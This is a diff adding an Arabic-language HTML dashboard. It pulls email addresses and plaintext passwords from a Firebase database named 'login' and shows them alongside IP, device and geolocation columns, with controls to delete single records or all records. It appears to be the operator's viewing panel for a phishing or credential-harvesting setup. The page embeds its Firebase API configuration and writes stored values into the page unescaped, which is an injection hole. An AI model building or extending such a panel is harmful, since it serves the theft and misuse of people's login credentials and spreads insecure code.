@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيانات المستخدمين</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: center;
+        }
+        .conter{
+          zoom: 40%;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+        }
+        th {
+            background-color: #f4f4f4;
+        }
+        button {
+            padding: 10px;
+            margin: 5px;
+            cursor: pointer;
+        }
+        .delete-btn {
+            background-color: #f44336;
+            color: white;
+            border: none;
+        }
+        .clear-btn {
+            background-color: #333;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h2>بيانات المستخدمين</h2>
+    <button class="clear-btn" id="clearAll">حذف جميع البيانات</button>
+<div class="conter">
+    <table>
+        <thead>
+            <tr>
+                <th>البريد الإلكتروني</th>
+                <th>كلمة المرور</th>
+                <th>التأكد من البريد</th>
+                <th>عنوان IP العام</th>
+                <th>نوع الجهاز</th>
+                <th>الموقع الجغرافي</th>
+                <th>إجراء</th>
+            </tr>
+        </thead>
+        <tbody id="userData"></tbody>
+    </table>
+</div>
+    <!-- Firebase -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDS2CQKGDgqu6u9rUCr-ujnUpgs09UJ3TI",
+            authDomain: "login-36b64.firebaseapp.com",
+            databaseURL: "https://login-36b64-default-rtdb.firebaseio.com/",
+            projectId: "login-36b64",
+            storageBucket: "login-36b64.appspot.com",
+            messagingSenderId: "271555679029",
+            appId: "1:271555679029:web:dff98f27f62bfed16b327c"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const usersRef = ref(db, 'users/');
+
+        // دالة لاستخراج نوع الجهاز
+        function getDeviceType() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes("android")) {
+                return "Android";
+            } else if (userAgent.includes("iphone") || userAgent.includes("ipad")) {
+                return "iPhone / iPad";
+            } else if (userAgent.includes("windows phone")) {
+                return "Windows Phone";
+            } else if (userAgent.includes("macintosh")) {
+                return "Mac";
+            } else if (userAgent.includes("windows nt")) {
+                return "Windows";
+            } else {
+                return "جهاز غير معروف";
+            }
+        }
+
+        // دالة للحصول على الموقع الجغرافي
+        function getDeviceLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    }, (error) => {
+                        reject("غير قادر على تحديد الموقع");
+                    });
+                } else {
+                    reject("الموقع غير مدعوم");
+                }
+            });
+        }
+
+        // عرض البيانات
+        onValue(usersRef, (snapshot) => {
+            const data = snapshot.val();
+            const table = document.getElementById('userData');
+            table.innerHTML = '';
+            
+            for (let key in data) {
+                // تحقق من البريد الإلكتروني (هل هو وهمي أم حقيقي)
+                const emailValidation = validateEmail(data[key].email) ? 'حقيقي' : 'وهمي';
+
+                // للحصول على عنوان الـ IP العام (استخدم API للحصول على IP العام)
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const userIP = ipData.ip; // IP العام
+                        const deviceType = getDeviceType(); // نوع الجهاز
+
+                        // الحصول على الموقع الجغرافي
+                        getDeviceLocation().then(location => {
+                            // عرض البيانات في الجدول
+                            const row = `
+                                <tr>
+                                    <td>${data[key].email}</td>
+                                    <td>${data[key].password}</td>
+                                    <td>${emailValidation}</td>
+                                    <td>${userIP}</td>
+                                    <td>${deviceType}</td>
+                                    <td>${location.latitude}, ${location.longitude}</td>
+                                    <td><button class="delete-btn" onclick="deleteUser('${key}')">حذف</button></td>
+                                </tr>
+                            `;
+                            table.innerHTML += row;
+                        }).catch(error => {
+                            // في حالة وجود مشكلة في الحصول على الموقع
+                            const row = `
+                                <tr>
+                                    <td>${data[key].email}</td>
+                                    <td>${data[key].password}</td>
+                                    <td>${emailValidation}</td>
+                                    <td>${userIP}</td>
+                                    <td>${deviceType}</td>
+                                    <td>${error}</td>
+                                    <td><button class="delete-btn" onclick="deleteUser('${key}')">حذف</button></td>
+                                </tr>
+                            `;
+                            table.innerHTML += row;
+                        });
+                    });
+            }
+        });
+
+        // تحقق من البريد الإلكتروني
+        function validateEmail(email) {
+            const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return regex.test(email);
+        }
+
+        // حذف بيانات مستخدم محدد
+        window.deleteUser = (key) => {
+            if (confirm('هل تريد حذف هذا المستخدم؟')) {
+                remove(ref(db, `users/${key}`));
+            }
+        };
+
+        // حذف جميع البيانات
+        document.getElementById('clearAll').addEventListener('click', () => {
+            if (confirm('هل تريد حذف جميع بيانات المستخدمين؟')) {
+                remove(usersRef);
+            }
+        });
+    </script>
+</body>
+</html>
